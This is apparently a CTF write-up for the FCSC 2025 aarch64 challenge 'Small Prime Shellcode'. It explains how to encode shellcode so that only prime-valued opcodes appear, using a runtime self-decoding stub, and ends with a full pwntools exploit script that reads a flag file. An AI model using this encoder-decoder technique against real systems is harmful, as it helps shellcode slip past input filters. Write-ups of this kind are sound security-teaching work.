+++
title = "FCSC 2025 | Small Prime Shellcode"
+++
# [Pwn] Small Prime Shellcode | FCSC 2025

* [1. Checksec](#checksecs)
* [2. Writeup](#writeup)
* [3. Full exploit](#full-exploit)


## Checksecs
```
[*] '/home/botman/Documents/challenges/FCSC/small_prime_shellcode/small-primes-shellcode'
    Arch:       aarch64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

## TL;DR
Constraints: only prime opcodes

Solution:
- Encode shellcode to use only prime opcodes
- Generate a decoder
- Send decoder + encoded shellcode

## Writeup

For this challenge, the only constraint for our shellcode was to use **only 6 prime opcodes**.

To create this shellcode, I started by searching through the [ARM documentation](https://developer.arm.com/documentation/ddi0602/2025-03?lang=en). I found some small results, but discovered a terrible truth: with this constraint, it was **impossible** to change the value of `x8`, and since `x8` stores the [syscall number](https://arm64.syscall.sh/), it was impossible to make any syscalls this way.

> <span style="color: #82aaff;">**ⓘ NOTES**</span>
>
> Changing the value of `x8` was impossible because, in ARM, the destination register is always located at the end of the opcode. All instructions allowing a write to `x8` ended with an 8 and, therefore, weren't prime numbers.

After some tears and a little depression, I reconnected my brain and started generating a **2.7GB** file containing all possible opcodes—and finally found a solution.

![meme](/images/small-primes-shellcode/meme.jpg)

Basically, I wrote a shellcode that restores the payload during execution. To ensure only prime opcodes, I:
1. Found the next prime number for each opcode in the payload.
2. Calculated the difference between the two.
3. During execution, subtracted the difference from the prime number to recover the original payload.

I did a lot of `grep` to find what I needed. I finally selected these instructions:
```asm
adds w1, w1, #4
ldr w5, [x0, w1, uxtw]

add w5, w5, #<number>
sub w5, w5, #<number>

adds w23, w23, #25
subs w23, w23, #0
str w5, [x0, w23, uxtw]
```

What do they do?

First, I use `w1` and `w23` as counters. They allow me to load the encoded payload into `w5` using `ldr`, and then store the decoded one back with `str`. Between these two, I apply an `add` and a `sub` on the opcode prime number stored in `w5`.

You may ask why I use both `add` and `sub` instead of just `sub`. This is because of the first constraint: I can't `add` and `sub` arbitrary numbers. So I extracted all possible opcode values and wrote them into `registers.py`. With these values, I created a small function that takes a target number and a list of available `add/sub` values, and returns the operations needed.

All I had to do was put everything into an exploit and boom:


## Full exploit
```python
from pwn import *
from sympy import nextprime
import registers

CHALL = "./small-primes-shellcode"

def opps(target, add_list, sub_list):
    for add in add_list:
        sub_target = add - target
        sub_idx = sub_list.index(sub_target) if sub_target in sub_list else None
        if sub_idx:
            sub = sub_list[sub_idx]
            return [add, sub]
    return None

def encode_shellcode(shellcode):
    payload = b''
    conv_table = []
    shellcode = bytes(asm(shellcode))

    for i in range(0, len(shellcode), 4):
        opcode = int.from_bytes(shellcode[i:i+4][::-1])
        prime = nextprime(opcode)

        payload += p32(prime)
        conv_table.append(prime - opcode)

    return payload, conv_table

def gen_decoder(conv_table):
    code = ''
    for diff in conv_table:
        w5 = opps(-diff, registers.a_w5, registers.s_w5)

        code += '''
        adds w1, w1, #4
        ldr w5, [x0, w1, uxtw]

        add w5, w5, #%i
        sub w5, w5, #%i

        adds w23, w23, #25
        subs w23, w23, #21
        str w5, [x0, w23, uxtw]
        ''' % (w5[0], w5[1])

    return bytes(asm(code))

def gen_prefix(length):
    w1 = opps(length+16, registers.a_w1, registers.s_w1)
    w23 = opps(length+16, registers.a_w23, registers.s_w23)

    prefix = '''
    adds w1, w1, #%i
    subs w1, w1, #%i

    adds w23, w23, #%i
    subs w23, w23, #%i
    ''' % (w1[0], w1[1], w23[0], w23[1])

    return bytes(asm(prefix))

def exploit(io, elf):
    payload, conv_table = encode_shellcode(shellcraft.cat("flag.txt"))
    decoder = gen_decoder(conv_table)
    prefix = gen_prefix(len(decoder))

    payload = flat(
        prefix,
        decoder,
        b'\x61\x02\x00\xd4',
        payload,
    )
    io.info("full payload size: %i bytes" % len(payload))

    padding = b"\x0b\x00\x00\x00"*int((0x400-len(payload))/4)
    io.send(payload + padding)
    flag = io.recv().decode()

    return flag
```


[download here](/exploits/small-primes-shellcode.py)

**Written by *0xB0tm4n***

